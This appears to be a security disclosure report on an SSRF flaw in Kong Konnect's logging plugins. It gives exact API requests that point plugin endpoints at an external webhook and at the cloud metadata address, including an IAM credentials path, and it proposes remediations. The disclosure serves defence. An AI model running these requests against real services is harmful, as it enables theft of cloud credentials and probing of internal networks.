# SSRF via Plugin Configuration Allows Requests to Internal/Cloud Metadata Endpoints

## Summary

Kong Konnect SaaS allows authenticated users to configure logging plugins (`http-log`, `opentelemetry`, `datadog`, `zipkin`) with arbitrary URLs, including internal IP ranges and cloud metadata endpoints (169.254.169.254). This is a Server-Side Request Forgery (SSRF) vulnerability that enables attackers to make Kong's infrastructure send HTTP requests to internal services.

**Key finding**: The `audit-log-destinations` API validates and blocks internal IPs, but plugin configuration APIs do not apply the same controls - indicating an inconsistent security implementation.

## Severity

**High**

- Attacker: Any user with free Konnect account
- Target: Kong's cloud infrastructure (not just attacker's own resources)
- Vector: SSRF to cloud metadata / internal network
- Proof: Confirmed out-of-band callback from Kong infrastructure IP

---

## Steps to Reproduce

### Prerequisites

1. Create a free Kong Konnect account at https://cloud.konghq.com
2. Create a Serverless Gateway (this provides a public Proxy URL)

### Step 1: Create a Service

```http
POST https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/services
Authorization: Bearer {YOUR_PAT_TOKEN}
Content-Type: application/json

{
  "name": "test-service",
  "url": "https://httpbin.org/anything"
}
```

**Response (201 Created):**
```json
{
  "id": "22a5ed47-2c54-425d-9ebb-ba6182ed5594",
  "name": "test-service",
  "host": "httpbin.org",
  "port": 443,
  "protocol": "https",
  "enabled": true
}
```

### Step 2: Create a Route

```http
POST https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/routes
Authorization: Bearer {YOUR_PAT_TOKEN}
Content-Type: application/json

{
  "name": "test-route",
  "paths": ["/test"],
  "service": {"id": "22a5ed47-2c54-425d-9ebb-ba6182ed5594"}
}
```

**Response (201 Created):**
```json
{
  "id": "3e962d05-6aee-44ce-aa53-324054184ef9",
  "name": "test-route",
  "paths": ["/test"],
  "service": {"id": "22a5ed47-2c54-425d-9ebb-ba6182ed5594"}
}
```

### Step 3: Create http-log Plugin with External Webhook (SSRF Proof)

```http
POST https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/plugins
Authorization: Bearer {YOUR_PAT_TOKEN}
Content-Type: application/json

{
  "name": "http-log",
  "config": {
    "http_endpoint": "https://webhook.site/66ea8061-8bec-4179-b850-02e3df121f4a"
  }
}
```

**Response (201 Created):**
```json
{
  "id": "bb1deb55-eaa1-4b92-b8c3-7cd5a436d507",
  "name": "http-log",
  "enabled": true,
  "config": {
    "http_endpoint": "https://webhook.site/66ea8061-8bec-4179-b850-02e3df121f4a",
    "method": "POST",
    "timeout": 10000
  }
}
```

### Step 4: Trigger the SSRF

Send any request through the gateway proxy:

```bash
curl https://kong-c4a986a932euc67wn.kongcloud.dev/test
```

### Step 5: Verify Callback Received

**Webhook.site received the following request from Kong infrastructure:**

```
IP: 205.234.240.46
User-Agent: lua-resty-http/0.17.2 (Lua) ngx_lua/10028
Method: POST
Time: 2025-11-25 17:39:14 UTC
```

**Request body (truncated):**
```json
{
  "client_ip": "77.91.70.30",
  "request": {
    "uri": "/test",
    "method": "GET",
    "headers": {
      "host": "kong-c4a986a932euc67wn.kongcloud.dev",
      "user-agent": "curl/8.15.0"
    }
  },
  "service": {
    "name": "test-svc",
    "host": "httpbin.org"
  },
  "latencies": {
    "kong": 10,
    "proxy": 306
  }
}
```

**This confirms that Kong's infrastructure (IP 205.234.240.46, located in Illinois, US) is making outbound HTTP requests to attacker-specified URLs.**

---

## Step 6: SSRF to Cloud Metadata Endpoint

Now demonstrate that internal/metadata IPs are also accepted:

```http
POST https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/plugins
Authorization: Bearer {YOUR_PAT_TOKEN}
Content-Type: application/json

{
  "name": "http-log",
  "config": {
    "http_endpoint": "http://169.254.169.254/latest/meta-data/"
  }
}
```

**Response (201 Created - NO VALIDATION):**
```json
{
  "id": "fa35b58c-6b3a-46d8-93f5-e4ed72e5c65b",
  "name": "http-log",
  "enabled": true,
  "config": {
    "http_endpoint": "http://169.254.169.254/latest/meta-data/"
  }
}
```

**The API accepts the cloud metadata endpoint without any validation or blocking.**

---

## Security Inconsistency

The `audit-log-destinations` API **does** validate and block internal IPs:

```http
POST https://us.api.konghq.com/v2/audit-log-destinations
Authorization: Bearer {TOKEN}
Content-Type: application/json

{
  "endpoint": "http://169.254.169.254/latest/meta-data/",
  "authorization_header": "test"
}
```

**Response (400 Bad Request):**
```json
{
  "status": 400,
  "title": "Bad Request",
  "detail": "endpoint in body should match '^https://'"
}
```

**Comparison:**

| API Endpoint | Internal IP Validation |
|--------------|----------------------|
| `audit-log-destinations` | ✅ Blocked (requires HTTPS, validates URL) |
| `plugins` (http-log) | ❌ No validation |
| `plugins` (opentelemetry) | ❌ No validation |
| `plugins` (datadog) | ❌ No validation |
| `plugins` (zipkin) | ❌ No validation |
| `services` | ❌ No validation |

This indicates that security controls were implemented for some endpoints but not applied consistently across the platform.

---

## Impact

### Why This is SSRF (Not Just a Feature)

1. **Attacker profile**: Any user with a free Konnect account
2. **Target**: Kong's shared cloud infrastructure, not just the attacker's isolated environment
3. **Action**: Force Kong workers to make HTTP requests to arbitrary destinations
4. **Scope**: Internal IP ranges (169.254.x.x, 10.x.x.x, 127.x.x.x, etc.) are not blocked

### What an Attacker Can Do

1. **Access Cloud Metadata**
   - `http://169.254.169.254/latest/meta-data/` - AWS instance metadata
   - `http://169.254.169.254/latest/meta-data/iam/security-credentials/` - IAM role credentials
   - Potentially obtain AWS access keys for Kong's infrastructure

2. **Internal Network Scanning**
   - Probe internal services on 10.x.x.x, 172.16.x.x, 192.168.x.x
   - Discover internal APIs, databases, admin panels

3. **Pivot for Further Attacks**
   - Use Kong infrastructure as a proxy to attack other internal services
   - Bypass network firewalls that trust internal IPs

4. **Information Disclosure**
   - Request metadata is sent to attacker endpoint (client IPs, headers, routing info)

### Limitations (for transparency)

- This is partially blind SSRF - attacker triggers the request but may not see full response
- Cloud metadata endpoint returned 502 in testing (possibly due to IMDSv2 or network policy)
- However, the request **is made** and configuration **is accepted** without any validation

---

## Affected Plugins

| Plugin | Vulnerable Field | Accepts Internal IPs |
|--------|-----------------|---------------------|
| http-log | `config.http_endpoint` | ✅ Yes |
| opentelemetry | `config.endpoint` | ✅ Yes |
| datadog | `config.host` | ✅ Yes |
| zipkin | `config.http_endpoint` | ✅ Yes |
| rate-limiting | `config.redis.host` | ✅ Yes |
| proxy-cache | `config.redis.host` | ✅ Yes |

Additionally, `services` and `upstreams` accept internal IPs in their URL/host fields.

---

## Remediation Recommendations

1. **Implement IP Blocklist** for all URL-accepting fields:
   - `169.254.0.0/16` (Link-local / Cloud metadata)
   - `127.0.0.0/8` (Localhost)
   - `10.0.0.0/8` (Private)
   - `172.16.0.0/12` (Private)
   - `192.168.0.0/16` (Private)
   - `::1/128`, `fd00::/8` (IPv6 private)

2. **Apply Consistent Validation** across all endpoints (use the same logic from `audit-log-destinations`)

3. **DNS Rebinding Protection**: Resolve hostnames and validate the resolved IP before making requests

4. **Require HTTPS** for external logging endpoints

---

## Testing Notes

- All testing was performed exclusively in my own Konnect account
- No attempts were made to access other organizations/tenants
- Cloud metadata was accessed minimally - only to demonstrate the vulnerability accepts the endpoint
- No actual secrets/credentials were extracted

## Environment

- **Platform**: Kong Konnect SaaS (cloud.konghq.com)
- **Region**: EU
- **Account Type**: Free tier
- **Gateway**: Serverless Gateway

---

## Supporting Evidence

### 1. Webhook.site Callback Log
```
Request received at: 2025-11-25 17:39:14 UTC
Source IP: 205.234.240.46 (Kong cloud infrastructure)
User-Agent: lua-resty-http/0.17.2 (Lua) ngx_lua/10028
Method: POST
Content-Type: application/json
```

### 2. Plugin Creation Response (Metadata Endpoint)
```json
{
  "config": {
    "http_endpoint": "http://169.254.169.254/latest/meta-data/"
  },
  "created_at": 1764092442,
  "enabled": true,
  "id": "fa35b58c-6b3a-46d8-93f5-e4ed72e5c65b",
  "name": "http-log"
}
```

### 3. Comparison with audit-log-destinations (Blocked)
```json
{
  "status": 400,
  "title": "Bad Request", 
  "detail": "endpoint in body should match '^https://'"
}
```
